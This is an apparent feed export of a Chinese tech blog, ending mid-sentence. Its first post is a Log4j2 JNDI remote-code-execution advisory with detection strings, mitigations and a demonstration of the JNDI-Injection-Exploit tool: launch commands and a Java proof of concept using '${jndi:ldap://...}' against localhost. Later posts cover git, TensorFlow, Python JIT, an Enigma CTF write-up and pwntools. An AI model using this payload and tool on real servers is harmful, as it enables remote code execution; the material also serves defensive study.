        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><h3 id="什么是-apache-log4j2">什么是 Apache Log4j2</h3><p>Apache Log4j2 是一款优秀的 Java 日志框架。该工具重写了 Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。IT之家获悉，由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p><h3 id="漏洞详情">漏洞详情</h3><h4 id="影响版本">影响版本</h4><p><strong>Apache Log4j</strong> 2.x &lt;= 2.14.1</p><h4 id="攻击检测">攻击检测</h4><p>可以通过检查日志中是否存在"<code>jndi:ldap://</code>","<code>jndi:rmi</code>"等字符来发现可能的攻击行为。</p><h4 id="安全建议">安全建议</h4><ol type="1"><li><p>升级 Apache Log4j2 所有相关应用到最新的 log4j-2.15.0-rc1版本，地址查看：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">点击此处</a>。</p></li><li><p>升级已知受影响的应用及组件，如<strong>spring-boot-strater-log4j2</strong> / <strong>ApacheSolr</strong> / <strong>Apache Flink</strong> / <strong>ApacheDruid</strong></p></li></ol><p>建议同时采用如下临时措施进行漏洞防范：</p><ul><li>1）添加 jvm启动参数<code>-Dlog4j2.formatMsgNoLookups=true</code>；</li><li>2）在应用 classpath 下添加 <code>log4j2.component.properties</code>配置文件，文件内容为 <code>log4j2.formatMsgNoLookups=true</code>；</li><li>3）<strong>JDK</strong> 使用 11.0.1、8u191、7u201、6u211及以上的高版本；</li><li>4）部署使用第三方防火墙产品进行安全防护。</li><li>5）将系统环境变量<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code> 设置为<code>true</code></li><li>6）尽快升级Apache Log4j2所有相关应用到最新的<code>log4j-2.15.0-rc2</code> 版本，地址https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</li></ul><p>据悉，Apache Log4j2 日志远程代码执行漏洞因此也影响了所有 Minecraft服务器。</p><h5 id="影响版本-1">影响版本</h5><p>Apache log4j2 &gt;= 2.0, &lt;= 2.14.1</p><p>Minecraft 全版本所有系列服务端，除 Mohist 1.18 外。</p><h3 id="漏洞利用">漏洞利用</h3><h2 id="介绍-1">介绍</h2><p>JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。</p><h2 id="使用">使用</h2><p>可执行程序为jar包，在命令行中运行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token punctuation">[</span>-C<span class="token punctuation">]</span> <span class="token punctuation">[</span>command<span class="token punctuation">]</span> <span class="token punctuation">[</span>-A<span class="token punctuation">]</span> <span class="token punctuation">[</span>address<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中:</p><ul><li><p><strong>-C</strong> - 远程class文件中要执行的命令。</p><p>（可选项 , 默认命令是mac下打开计算器，即"open/Applications/Calculator.app"）</p></li><li><p><strong>-A</strong> - 服务器地址，可以是IP地址或者域名。</p><p>（可选项 , 默认地址是第一个网卡地址）</p></li></ul><p>注意:</p><ul><li><p>要确保<strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用。</p><p>或者你也可以在<code>run.ServerStart</code>类<strong>26</strong>-<strong>28</strong>行更改默认端口。</p></li><li><p>命令会被作为参数传入<strong>Runtime.getRuntime().exec()</strong>，</p><p>所以需要确保命令传入exec()方法可执行。</p><p><strong>bash等可在shell直接执行的相关命令需要加双引号，比如说 java-jar JNDI.jar -C "bash -c ..."</strong></p></li></ul><h3 id="示例">示例</h3><h4 id="本地演示">本地演示：</h4><ol type="1"><li><p>启动 JNDI-Injection-Exploit:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">"open /Applications/Calculator.app"</span> <span class="token parameter variable">-A</span> <span class="token string">"127.0.0.1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>把第一步中生成的 JNDI链接注入到存在漏洞的应用环境中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>    <span class="token class-name">InitialContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1/fgf4fp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当上面代码运行后，应用便会执行相应命令，这里是弹出计算器。</p></li></ol><h3 id="工具实现">工具实现</h3><ol type="1"><li>首先生成的链接后面<code>codebaseClass</code>是6位随机的，这个是因为不希望让工具生成的链接本身成为一种特征被监控或拦截。</li><li>服务器地址实际就是<code>codebase</code>地址，相比于<code>marshalsec</code>中的<strong>JNDIserver</strong>来说，这个工具把<strong>JNDIserver</strong>和<strong>HTTPserver</strong>绑定到一起，并自动启动<strong>HTTPserver</strong>返回相应class，更自动化了。</li><li><strong>HTTPserver</strong>基于jetty实现的，本质上是一个能下载文件的<code>servlet</code>，比较有意思的是我提前编译好class模板放到<code>resource</code>目录，然后servlet会读取class文件，使用ASM框架对读取的字节码进行修改，然后插入我们想要执行的命令，返回修改后的字节码。</li></ol><h3 id="apache-log4j-远程代码执行">Apache Log4j 远程代码执行</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> log4j <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4j<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${jndi:ldap://127.0.0.1:1389/a}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><figure><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/45926593/145425339-47c71230-87d2-4519-8919-9c3520850f83.png" alt="Success"><figcaption aria-hidden="true">Success</figcaption></figure><h3 id="参考文档项目">参考文档/项目</h3><ul><li><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></li><li><a href="https://github.com/bkfish/Apache-Log4j-Learning">https://github.com/bkfish/Apache-Log4j-Learning</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></li><li><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></li><li><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>处理Fork仓库与源仓库更新同步问题</title>
      <link href="/2021/12/09/ru-he-chu-li-fork-cang-ku-yu-yuan-cang-ku-geng-xin-tong-bu-wen-ti/"/>
      <url>/2021/12/09/ru-he-chu-li-fork-cang-ku-yu-yuan-cang-ku-geng-xin-tong-bu-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>如果远程主仓库的历史 <code>Commits</code>被修改整理过，而自己在未同步远程主仓库的情况下有新的 <code>PR</code>需要提交，可以有两个方案处理：</p><ol type="1"><li><code>Fork</code> 最新的远程主仓库，重新提交 1.1 备份自己的改动 1.2删除自己的 <code>Fork</code> 的仓库，重新 <code>Fork</code> 远程主仓库1.3 将最新改动的应用到新 <code>Fork</code> 的仓库，然后提交<code>PR</code></li><li>强制同步远程主仓库的所有历史<code>Commits</code>，处理冲突，再次提交（适用于上次更新后自己所做的改动不大；或改动大但与源冲突少）2.1备份自己的改动（可以选择用一个新的分支或者直接将问题复制到本地存储的其他文件目录）2.2 添加远程主仓库为自己本地仓库的一个 <code>upstream</code>（如命名为<code>origin</code>），使用以下命令强制同步<code>git fetch origin &amp;&amp; git reset --hard origin/master &amp;&amp; git clean -f -d</code>2.3 将自己的改动应用到强制同步过的分支，如果使用的其他分支备份，可以使用<code>rebase</code> 命令合并过来，如果有冲突，处理冲突 2.4 检查自己的<code>Commits</code> 是否正确合理，无问题则可重新提交<code>PR</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TensorFlow2动态GPU内存分配</title>
      <link href="/2021/12/05/tensorflow2-dong-tai-gpu-nei-cun-fen-pei/"/>
      <url>/2021/12/05/tensorflow2-dong-tai-gpu-nei-cun-fen-pei/</url>
      
        <content type="html"><![CDATA[<p>TensorFlow2运行时，程序会缺省地请求开辟全部的GPU内存，导致<code>OUT_OF_MEMORY</code>报错。</p><p>解决方案：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf <span class="token keyword">import</span> osos<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'CUDA_VISIBLE_DEVICES'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token comment"># 具体以 TensorFlow 的 list 为准， 不是任务管理器里的 CPU id ！！！</span>config<span class="token operator">=</span>tf<span class="token punctuation">.</span>compat<span class="token punctuation">.</span>v1<span class="token punctuation">.</span>ConfigProto<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># CPU最大占用率，此处为80%（可选）</span><span class="token comment"># config.gpu_options.per_process_gpu_memory_fraction=0.8</span>config<span class="token punctuation">.</span>gpu_options<span class="token punctuation">.</span>allow_growth <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 设置动态分配GPU内存</span>sess<span class="token operator">=</span>tf<span class="token punctuation">.</span>compat<span class="token punctuation">.</span>v1<span class="token punctuation">.</span>Session<span class="token punctuation">(</span>config<span class="token operator">=</span>config<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> ML </tag>
            
            <tag> TensorFlow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“让你的蛇蛇快爬吧”——使用各式JIT加速Python运行</title>
      <link href="/2021/12/01/rang-ni-de-she-she-kuai-pa-shi-yong-ge-shi-jit-jia-su-python-yun-xing/"/>
      <url>/2021/12/01/rang-ni-de-she-she-kuai-pa-shi-yong-ge-shi-jit-jia-su-python-yun-xing/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么python比cc慢">为什么Python比C/C++慢？</h3><h4 id="动态特性">动态特性</h4><p><code>Python</code>是一种动态、多功能的语言，因此运行起来会相对缓慢。</p><p>在<code>C</code>、<code>C++</code>、<code>Java</code>、<code>C#</code>、<code>Go</code>这些<strong>静态类型语言</strong>中，必须在声明变量时指定变量的类型。而在<strong>动态类型语言</strong>中，虽然也有类型的概念，但变量的类型是<strong>可改变</strong>的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">1</span>a <span class="token operator">=</span> <span class="token string">"foo"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在上面这个示例里，<code>Python</code> 将变量 <code>a</code>一开始存储<strong>整数</strong>类型变量的内存空间释放了，并创建了一个新的存储<strong>字符串</strong>类型的内存空间，并且和原来的变量同名。</p><p>静态类型语言这样的设计并不是为了为难你，而是为了方便 CPU运行而这样设计的。因为最终都需要将所有操作都对应为简单的二进制操作，因此必须将对象、类型这些高级的数据结构转换为低级数据结构。</p><p><code>Python</code>也实现了这样的转换，但用户看不到这些转换，也不需要关心这些转换。</p><p>不用必须声明类型并不是为了使 Python 运行慢，Python的设计是让用户可以让各种东西变得动态：可以在运行时更改对象上的方法，也可以在运行时动态添加底层系统调用到值的声明上，可用性恨高。</p><p>但也正是这种设计使得 <code>Python</code> 的优化异常的难。</p><p><strong>但我们不需责备Python，这也是Python的一种设计理念。</strong></p><h4 id="全局解释器锁">全局解释器锁</h4><p>现代计算机都配备了具有多个核的 CPU，有时甚至还会有多个处理器。为了更充分利用它们的处理能力，操作系统定义了一个称为线程的低级结构。某一个进程（例如Chrome浏览器）可以建立多个线程，在系统内执行不同的操作。在这种情况下，CPU密集型进程就可以跨核心分担负载了，这样的做法可以大大提高应用程序的运行效率。</p><p>例如在我写这篇文章时，我的 Chrome 浏览器打开了 44个线程。需要提及的是，基于 POSIX 的操作系统（例如 Mac OS、Linux）和Windows 操作系统的线程结构、API都是不同的，因此操作系统还负责对各个线程的调度。</p><p>如果你还没有写过多线程执行的代码，你就需要了解一下线程锁的概念了。多线程进程比单线程进程更为复杂，是因为需要使用线程锁来确保同一个内存地址中的数据不会被多个线程同时访问或更改。</p><p>CPython解释器在创建变量时，首先会分配内存，然后对该变量的引用进行计数，这称为<em>引用计数(reference counting)</em>。如果变量的引用数变为<code>0</code>，这个变量就会从内存中释放掉。这就是在 for循环代码块内创建临时变量不会增加内存消耗的原因。</p><p>而当多个线程内共享一个变量时，CPython 锁定引用计数的关键就在于使用了GIL，它会谨慎地控制线程的执行情况，无论同时存在多少个线程，解释器每次只允许一个线程进行操作。</p><blockquote><p>trn曾做过关于上文的presentation，大家应该有印象，也应该有印象</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://lh3.googleusercontent.com/proxy/t6rhELZuh8ap6jvtl0GPv7Lty49_ZUt4NgCrRjHU9vurSm8koUdli5guyzGcy3NJuhOKwG11qAnP_cw1sg=s0-d" alt="GIL Compete"><figcaption aria-hidden="true">GIL Compete</figcaption></figure><blockquote><p>由 David Beazley 提供的 GIL 竞争情况图<a href="https://dabeaz.blogspot.com/2010/01/python-gil-visualized.html">原文链接</a></p></blockquote><h3 id="如何优化">如何优化？</h3><h4 id="jit">JIT</h4><blockquote><p>TL;DR:</p><p><a href="https://zh.wikipedia.org/wiki/%E5%8D%B3%E6%99%82%E7%B7%A8%E8%AD%AF">即时编译(JIT)- Wikipedia</a></p></blockquote><h4 id="jit的安装">JIT的安装</h4><h5 id="pypy">PyPy</h5><blockquote><p>https://doc.pypy.org/en/latest/install.html</p></blockquote><ul><li><p>使用打包好的 <code>PyPy</code> - 使用 <code>Anaconda</code> /<code>Miniconda</code> 的同学</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ conda create <span class="token parameter variable">-my_cool_pypy</span> pypy$ conda activate my_cool_pypy$ conda <span class="token function">install</span> scipy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>Windows</code>安装预先构建的 <code>PyPy</code></p><p>http://www.pypy.org/download.html</p><p>解压配置环境变量后可用</p><p><code>python</code> -&gt; <code>pypy3</code></p><p><code>pip</code>:如果加入PATH可能会引起紊乱，建议使用<code>pypy3 -m pip install [包名]</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pypy3 get-pip.py　　　　　　    <span class="token comment"># 安装 PyPy 的 PIP</span>$ pypy3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> requests  <span class="token comment"># 安装 requests 包</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>Linux</code>安装预先构建的 <code>PyPy</code> -身心没被摧残完的同学</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">tar</span> xf pypy-x.y.z.tar.bz2$ ./pypy-x.y.z/bin/pypyPython <span class="token number">2.7</span>.x <span class="token punctuation">(</span>xxxxxxxxxxxx, Date, Time<span class="token punctuation">)</span><span class="token punctuation">[</span>PyPy z.y.x with GCC z.y.x<span class="token punctuation">]</span> on linux2Type <span class="token string">"help"</span>, <span class="token string">"copyright"</span>, <span class="token string">"credits"</span> or <span class="token string">"license"</span> <span class="token keyword">for</span> <span class="token function">more</span> information.And now <span class="token keyword">for</span> something completely different: ``PyPy is an exciting technologythat lets you to <span class="token function">write</span> fast, portable, multi-platform interpreters with <span class="token function">less</span>effort<span class="token string">''</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><blockquote><p><code>PyPy</code> 支持的包可以在此处查询：http://packages.pypy.org/</p></blockquote><h5 id="pyjion">Pyjion</h5><blockquote><p>https://github.com/tonybaloney/Pyjion</p></blockquote><p>比 <code>Pypy</code>更快，但需要<code>Python 3.10.0</code>+及<code>.Net 6</code></p><ul><li><p>安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pyjion<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pyjionpyjion<span class="token punctuation">.</span>enable<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pyjion <span class="token punctuation">[</span>你的文件<span class="token punctuation">]</span>.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>也提供了一些类似<code>g++</code>/<code>cpp</code><strong>O2/O3/Ofast</strong>优化的功能。（OI选手狂喜！）</p><blockquote><p>https://pyjion.readthedocs.io/en/latest/optimizations.html</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BrokenEnigma-WriteUp</title>
      <link href="/2021/11/30/brokenenigma-writeup/"/>
      <url>/2021/11/30/brokenenigma-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="brokenenigma-writeup">BrokenEnigma WriteUp</h1><h2 id="什么是enigma">什么是Enigma</h2><blockquote><p><a href="https://zh.wikipedia.org/wiki/恩尼格玛密码机/">恩尼格玛密码机 -Wikipedia</a></p></blockquote><p>不太严格地来讲，Enigma加密系统可以视作一个权值<strong>近似随机</strong>的凯撒密码双向算子。这使得<strong>频率分析</strong>对其无效。当然，它也有弱点，也就是后来的<strong>已知明文攻击</strong>。</p><p>Enigma的设计初衷是通过其3个转子（德国海军版为4个），每个转子将一个字符映射到另一个字符，且每次对单个字符加密或解密后，映射关系都会变化，带来庞大的密钥空间，使得密码分析人员难以通过暴力方式进行破译。</p><h2 id="加密过程分析">加密过程分析</h2><p>这里省略电路和显示部分</p><h3 id="转子">转子</h3><p>转子组成了恩尼格玛密码机的核心部分。一系列由弹簧承载的黄铜管脚呈环形排列于其中一面，而另一面相对应的则是圆形的金属触点。管脚与触点代表的是字母表上的全部字母，典型的排列就是<code>A-Z</code>（以下的介绍全部假设转子为这种排列方式）。当两个转子的位置相邻时，其中一个的管脚就会接触另外一个的金属触点，这就形成了一个通路。在转子内部，有<code>26</code>条金属线将一面的管脚与另一面的触点连接起来，<strong>这些金属线的排列方式在每个转子内都有所不同</strong>。当被放进恩尼格玛密码机后，一个转子可以有26种排列方法。</p><p>此时，我们可以认为转子是一个对于<strong>A-Z</strong>空间内字符的<strong>双射</strong>。</p><p>这也是其能同时加解密的重要基础。</p><h3 id="转动">转动</h3><p>为了避免产生简单（并且容易破译）的加密信息，有些转子在操作员连续按下同一个键时也会转动。这就保证了每次按键得到的结果都不一样，也就会产生很难破译的复式密码。</p><p>在德国防卫军的恩尼格玛密码机中，每个转子都有一个可调节的带缺口的外环。5个最基本的转子（I-V）各有一个缺口，而附加的转子VI、VII和VIII各有两个缺口。在转子转动到某一点时，第二个转子的防倒转爪正好位于它的缺口之内，这就使第二个转子在下一次按键后也会转动。当防倒转爪位于缺口之外时，它就只会沿着另一个转子外环的光滑边缘滑动。在所有转子都只有一个缺口的系统中，第一个转子每转26次就会使第二个转子转动一次，同样的，第二个转子每转动26次就会使第三个转子转动一次。第三个转子转动的同时第二个转子也会转动。</p><p>这里较难理解，可以想象一下水表示数器或者体育记分牌的原理。</p><p>当拥有三个转子，并且第一和第二个转子的外环各有一个缺口时，一台恩尼格玛密码机就会拥有<span class="math inline">\(26×25×26 = 16,900\)</span>个组合（不是<span class="math inline">\(26 X 26 X26\)</span>。因为第二个转子会与第三个转子一起转动，这里很难向大家解释，就暂且这么认为吧）。在德国军队的实际使用中，为了安全，每条信息的长度都被限制在几百个字母以内，所以在同一条信息中输入同样的字母产生同样的密码的几率是很小的。</p><p>当按下一个键后，转子会在电路接通<strong>之前</strong>转动。</p><p><strong>之前！</strong></p><h3 id="反射器">反射器</h3><p>恩尼格玛密码机的最后一个转子之后都有一个反射器，反射器是恩尼格玛密码机与当时其它转子机械之间最显著的区别。它将最后一个转子的其中两个触点连接起来，并将电流沿一个不同的路线导回。这就使加密过程与解密过程变得一致。但是，反射器也使恩尼格玛密码机具有了如下性质：<strong>加密后得到的字母与输入的字母永远永远不会相同</strong>。这在概念上和密码学上都是一个<strong>严重</strong>甚至<strong>致命</strong>的错误，这个错误最终被波兰和英国密码分析人员利用，最终使得Enigma加密系统土崩瓦解。</p><h3 id="接线板">接线板</h3><p>接线板上的每条线都会连接一对字母。这些线的作用就是在电流进入转子前改变它的方向。为了解释它的原理，我们把E插口和Q插口连接起来。当操作员按下E键时，电流就会先流到Q插口（相当于按下Q键）再流经转子。接线板上最多可以同时接13条线。</p><p>电流会从键盘流经接线板，之后进入转子。接线板上的每个插口内都有两个插孔，当将插头插入时，上插孔（连到键盘）与下插孔（连到转子）之间的连接就会被断开。另外一个插口内的上插孔会与此插口内的下插孔连接起来，而下插孔会与此插口内的上插孔连接起来，这样就完成了两个插口之间的连接。</p><p>依然，相当于双射，否则加解密无法结合。</p><h3 id="数学描述">数学描述</h3><p>恩尼格玛对每个字母的加密过程可以以数学的角度看作为一个组合过程。假设我们有一台德国陆军/空军版3转子恩尼格玛密码机，让P表示接线板的连线，U表示反射器，L、M、R表示左、中、右转子。那么加密后的信息E就可以表示成</p><p><span class="math display">\[E = PRMLU{L^{ - 1}}{M^{ - 1}}{R^{ - 1}}{P^{ - 1}}{E_0}\]</span></p><h2 id="关于此道ctf题目">关于此道CTF题目</h2><p>转子转动的时机出现了错误，在电路接通<strong>之后</strong>转动了，改写代码即可修复。</p><p>源代码可在我的<a href="https://github.com/sfc9982/Enigma">Github</a>上找到</p><h3 id="题目背景">题目背景</h3><p>我的Fork原项目是一位SE在NASDAQ的获奖项目，但是我尝试了几组输入，发现输出与预期不同，对代码审计后发现代码有误，已PR。截至发文时未Merge。</p><h2 id="现实中的enigma是怎么被攻破的">现实中的Enigma是怎么被攻破的？</h2><p>自己了解更有意思，如果感兴趣的人足够的话，我可以在周会上浅谈下（笑）。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python高适应性暴力枚举破解工具-Pwntools.mBruteForce简介</title>
      <link href="/2021/11/30/python-gao-gua-ying-xing-bao-li-mei-ju-po-jie-gong-ju-pwntools-mbruteforce-jian-jie/"/>
      <url>/2021/11/30/python-gao-gua-ying-xing-bao-li-mei-ju-po-jie-gong-ju-pwntools-mbruteforce-jian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="背景">背景</h2><p>在算法竞赛和CTF的Misc/Crypto类题中，我们有时时间仓促，无法花费时间于代码/公式/定理分析，或规律推断；或者时间非常充裕，有能力采取暴力枚举的方式解题。</p><p>工具<code>mBruteforce</code>应运而生</p><h3 id="简介">简介</h3><h4 id="mbruteforce">mBruteForce</h4><blockquote><p>官方文档：<a href="https://docs.pwntools.com/en/stable/util/iters.html?highlight=mbruteforce#pwnlib.util.iters.mbruteforce">Docs- PwnTools: mBruteForce</a></p></blockquote><p><code>pwnlib.util.iters.mbruteforce</code><strong>(<em>func</em>,<em>alphabet</em>, <em>length</em>, <em>method = 'upto'</em>, <em>start= None</em>, <em>threads = None</em>)</strong>[<a href="https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/util/iters.py#L854-L938">source]</a></p><p>与<code>bruteforce()</code>具有相同功能，但却是多线程实现。</p><table><thead><tr class="header"><th style="text-align: center;"><strong>参数：</strong></th><th><strong>属性</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>alphabet</strong></td><td>字符集合</td></tr><tr class="even"><td style="text-align: center;"><strong>length</strong></td><td>字符串长度</td></tr><tr class="odd"><td style="text-align: center;"><strong>method</strong></td><td>枚举方式</td></tr><tr class="even"><td style="text-align: center;"><strong>start</strong> (*func**,*)</td><td>被枚举函数表达式</td></tr><tr class="odd"><td style="text-align: center;"><strong>threads</strong></td><td>线程数</td></tr></tbody></table><p>Example:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> mbruteforce<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">==</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">,</span> length <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token string">'hello'</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> mbruteforce<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">==</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'hlo'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'downfrom'</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token boolean">True</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> mbruteforce<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">==</span> <span class="token string">'no'</span><span class="token punctuation">,</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'fixed'</span><span class="token punctuation">)</span><span class="token string">'no'</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> mbruteforce<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">==</span> <span class="token string">'9999'</span><span class="token punctuation">,</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> threads<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">'9999'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行参数">运行参数</h4><p><code>mbruteforce(func, alphabet, length, method='upto', start=None, threads=None)</code></p><ul><li><code>func</code>在其返回1前枚举；</li><li><code>alphabet</code>输入的字符集合，如<code>string.ascii_letters</code>,<code>string.hexdigits</code>；</li><li><code>length</code>最大字符串长度；</li><li><code>method</code>缺省'upto'，指定穷举的字符串长度从1增大到length；<code>'fixed'</code>固定字符串长度；<code>'downfrom'</code> 